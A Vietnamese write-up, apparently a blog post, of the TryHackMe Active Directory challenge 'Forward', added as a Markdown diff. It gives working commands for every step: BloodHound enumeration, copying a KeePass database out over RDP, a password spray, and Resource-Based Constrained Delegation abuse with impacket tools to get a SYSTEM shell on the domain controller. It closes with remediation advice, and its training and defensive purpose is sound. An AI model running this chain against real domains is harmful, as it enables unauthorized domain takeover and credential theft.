@@ -1,0 +1,192 @@
+---
+title: 'Forward'
+description: 'Từ một tài khoản AD quyền thấp, lấy trộm database KeePass qua RDP, spray lại mật khẩu help-desk dùng chung để chiếm tài khoản có quyền ghi trên DC, rồi lạm dụng Resource-Based Constrained Delegation để giả danh Administrator.'
+date: 2026-06-20
+platform: tryhackme
+room: 'Forward'
+roomUrl: 'https://tryhackme.com/room/forwardchallenge'
+difficulty: medium
+tags:
+  - 'active-directory'
+  - 'kerberos'
+  - 'smb'
+  - 'rdp'
+  - 'windows'
+  - 'password-cracking'
+  - 'privesc'
+  - 'rbcd'
+vulnClasses:
+  - 'password reuse'
+  - 'resource-based constrained delegation'
+translation: done
+draft: false
+---
+
+_Hướng dẫn giải challenge Active Directory "Forward" trên TryHackMe. Chúng ta bắt đầu với duy nhất một tài khoản domain quyền thấp, lấy trộm một database KeePass trên Domain Controller qua RDP, lần vào một tài khoản help-desk có mật khẩu bị dùng lại cho nhiều người, và kết thúc bằng việc lạm dụng Resource-Based Constrained Delegation (RBCD) để đúc một vé Kerberos với danh nghĩa Administrator._
+
+> Forward là một challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác ở đây đều thực hiện trên mục tiêu luyện tập được cấp phép. Flag, mật khẩu khởi đầu được cấp, và mọi credential khôi phục được trên máy đều hiển thị dưới dạng `<redacted>` — chúng có thật trên máy nhưng được giấu đi ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Xác thực vào một Windows DC (`DC01.ctf.local`, domain `ctf.local`) bằng tài khoản được cấp `j.smith` → BloodHound cho thấy `j.smith` được phép RDP và `r.williams` nắm quyền `AddAllowedToAct` trên DC → RDP vào và lấy trộm `Database.kdbx` trong thư mục Documents của `j.smith` → mở bằng KeePass để khôi phục mật khẩu của `t.jones` → **spray chính mật khẩu đó** khắp domain và nó cũng mở khoá `r.williams` (password reuse) → `r.williams` có thể ghi `msDS-AllowedToActOnBehalfOfOtherIdentity` trên `DC01`, nên ta cấu hình **RBCD** và dùng S4U để giả danh `Administrator` → `psexec` bằng vé giả mạo để có shell SYSTEM trên DC.
+
+User quyền thấp → Domain Admin, chỉ nhờ một database lấy trộm và một mật khẩu dùng lại.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+```
+
+Một lượt quét dịch vụ `nmap` vẽ ra một Domain Controller của Active Directory không thể lẫn vào đâu:
+
+```text
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: ctf.local)
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Global Catalog
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+```
+
+Kerberos (88/464), LDAP (389/636/3268) và DNS (53) xác nhận host là DC của `ctf.local`; chứng chỉ RDP đặt tên nó là `DC01.ctf.local` (Windows Server 2019). SMB bật message signing và bắt buộc. Ánh xạ tên này ở máy local để công cụ Kerberos phân giải được:
+
+```text
+echo "$IP  DC01.ctf.local ctf.local DC01" | sudo tee -a /etc/hosts
+```
+
+Phòng cấp cho ta một credential khởi đầu duy nhất, `j.smith:<redacted>`.
+
+### **Lỗ hổng**
+
+Forward không phải một CVE đơn lẻ — nó là một chuỗi các cấu hình sai thường gặp của Active Directory: một credential đặc quyền bị bỏ quên trong file KeePass trên DC, một mật khẩu help-desk dùng lại cho nhiều tài khoản, và một ACL nguy hiểm cho phép một user không phải admin ghi thuộc tính delegation của chính Domain Controller.
+
+<Callout type="insight">
+
+Mấu chốt là **Resource-Based Constrained Delegation**. Nếu bạn ghi được `msDS-AllowedToActOnBehalfOfOtherIdentity` trên một đối tượng computer, bạn có thể chỉ định _bất kỳ_ tài khoản nào bạn kiểm soát là "được tin cậy để uỷ quyền" tới computer đó — rồi dùng phần mở rộng Kerberos S4U2Self/S4U2Proxy để yêu cầu một service ticket _với danh nghĩa bất kỳ user nào_, kể cả một Domain Admin. DC tin vé đó vì nó tin chính mình.
+
+</Callout>
+
+### **Bước 1 — liệt kê SMB và domain**
+
+Với tài khoản khởi đầu, ta liệt kê các share và thu thập trọn bộ dữ liệu BloodHound:
+
+```text
+nxc smb $IP -u j.smith -p '<redacted>' --shares
+bloodhound-python --zip -c All -d ctf.local -u 'j.smith' -p '<redacted>' -dc DC01.ctf.local -ns $IP
+```
+
+Các share không có gì đặc biệt (chỉ một `Downloads` đọc được nhưng rỗng), nhưng BloodHound thì mang tính quyết định. Hai dữ kiện nổi bật:
+
+- `j.smith` là thành viên của nhóm **Remote Desktop Users** — ta có thể RDP vào `DC01`.
+- `r.williams` nắm quyền **`AddAllowedToAct`** (ghi lên `msDS-AllowedToActOnBehalfOfOtherIdentity`) trên Domain Controller — đúng quyền cần cho RBCD.
+
+Ta chưa có mật khẩu của `r.williams`, nên bàn đạp RDP đến trước.
+
+### **Bước 2 — RDP vào và lấy trộm database KeePass**
+
+```text
+xfreerdp3 /v:$IP /u:j.smith /p:'<redacted>' /d:ctf.local +clipboard /dynamic-resolution
+```
+
+Trong profile của `j.smith` có một kho credential:
+
+```text
+C:\Users\j.smith\Documents\Database.kdbx
+```
+
+Mở lại RDP với một ổ đĩa được ánh xạ để file được copy thẳng về máy tấn công:
+
+```text
+xfreerdp3 /v:$IP /u:j.smith /p:'<redacted>' /d:ctf.local +clipboard /drive:share,/tmp
+# sau đó, bên trong phiên RDP:
+copy C:\Users\j.smith\Documents\Database.kdbx \\tsclient\share\
+```
+
+Bản `keepass2john` trên Kali từ chối định dạng KDBX 4 (`File version '40000' is currently not supported`), nên nước đi thực dụng là mở thẳng database bằng một KeePass client thay vì vật lộn với lệch phiên bản. Bên trong, ta khôi phục được credential của **`t.jones`** (giá trị đã được giấu).
+
+### **Bước 3 — password spray: một mật khẩu, hai tài khoản**
+
+Mật khẩu khôi phục của `t.jones` xác thực được qua SMB. Thú vị hơn, khi ta dựng một danh sách user và spray _chính_ mật khẩu đó khắp domain, nó mở khoá thêm một tài khoản thứ hai:
+
+```text
+nxc smb DC01.ctf.local -u t.jones -p '<redacted>' --users   # thu thập danh sách user
+nxc smb DC01.ctf.local -u users_list.txt -p '<redacted>' --continue-on-success
+# [+] ctf.local\t.jones:<redacted>
+# [+] ctf.local\r.williams:<redacted>
+```
+
+`r.williams` dùng lại mật khẩu help-desk — và `r.williams` chính là tài khoản mà BloodHound đã đánh dấu có `AddAllowedToAct` trên DC.
+
+### **Bước 4 — lạm dụng RBCD để giả danh Administrator**
+
+Một user domain bình thường có thể tạo tối đa 10 tài khoản máy (`MachineAccountQuota`). Ta tạo một cái, trỏ thuộc tính delegation của DC về nó, rồi yêu cầu một vé với danh nghĩa `Administrator`:
+
+```text
+# 1) tạo một computer account mà ta kiểm soát
+impacket-addcomputer ctf.local/r.williams:'<redacted>' \
+  -computer-name 'ATTACKMKY$' -computer-pass '123456' -dc-ip $IP
+
+# 2) ghi RBCD lên DC01, tin cậy computer account của ta
+impacket-rbcd -action write -delegate-to 'DC01$' -delegate-from 'ATTACKMKY$' \
+  -dc-ip $IP -dc-host DC01.ctf.local ctf.local/r.williams:'<redacted>'
+
+# 3) dùng S4U giả danh Administrator để lấy vé CIFS trên DC
+impacket-getST -dc-ip $IP -spn cifs/DC01.ctf.local \
+  -impersonate Administrator ctf.local/ATTACKMKY$:'123456'
+```
+
+Nạp vé và kết nối — không cần mật khẩu:
+
+```text
+export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
+impacket-psexec -k -no-pass DC01.ctf.local -dc-ip $IP
+# C:\Windows\system32>
+```
+
+Ta có một shell SYSTEM trên DC. Flag nằm trên desktop của Administrator:
+
+```text
+C:\Users\Administrator\Desktop> more flag.txt
+THM{<redacted>}
+```
+
+Từ đây cả domain là của ta — `secretsdump` qua cùng vé Kerberos đó sẽ dump bí mật SAM/NTDS để duy trì quyền truy cập.
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Nghiêm trọng — CVSS 3.1 \~8.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`). Một tài khoản domain quyền thấp duy nhất dẫn tới xâm phạm toàn bộ domain: kho KeePass lấy trộm và một mật khẩu help-desk dùng lại trao cho ta `r.williams`, mà quyền `AddAllowedToAct` của tài khoản này trên Domain Controller cho phép lạm dụng RBCD và giả danh Administrator qua Kerberos. Trạng thái cuối là SYSTEM trên DC và khả năng dump mọi bí mật domain (NTDS.dit), tức Domain Admin bền vững.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+- **Gỡ bỏ ACL nguy hiểm.** Không user thường nào nên nắm `AddAllowedToAct` / quyền ghi lên `msDS-AllowedToActOnBehalfOfOtherIdentity` trên một Domain Controller. Hãy audit quyền ghi trên các đối tượng computer và phân tầng (tier) quản trị.
+- **Đặt** **`MachineAccountQuota`** **về 0.** Chặn user thường tạo tài khoản máy sẽ loại bỏ điểm tựa mà hầu hết các cuộc tấn công RBCD phụ thuộc vào.
+- **Ngừng lưu credential đặc quyền trong các file KeePass có thể truy cập** trên DC, và **cấm dùng lại mật khẩu** giữa các tài khoản — lượt spray chỉ thành công vì mật khẩu help-desk bị dùng chung. Hãy ép mật khẩu duy nhất và phân tầng các tài khoản nhạy cảm.
+- **Giới hạn RDP vào DC** chỉ cho administrator; `j.smith` không có lý do gì để được quyền đăng nhập tương tác trên một Domain Controller.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **BloodHound chỉ cho bạn nhắm exploit vào đâu.** Cạnh `AddAllowedToAct` biến một bàn đạp RDP tầm thường thành đường thẳng tới Domain Admin.
+- **RBCD là một tấn công dựa trên quyền ghi.** Kiểm soát một thuộc tính delegation cộng với khả năng tạo một tài khoản máy là đủ để giả danh bất kỳ ai tới host đó.
+- **Password reuse làm sụp đổ việc phân tầng.** Một mật khẩu help-desk bẻ được đã mở khoá đúng tài khoản sở hữu thuộc tính delegation của DC.
+
+Forward là một chuỗi AD gọn gàng từ đầu đến cuối: lấy trộm, dùng lại, uỷ quyền. Cảm ơn đã đọc.
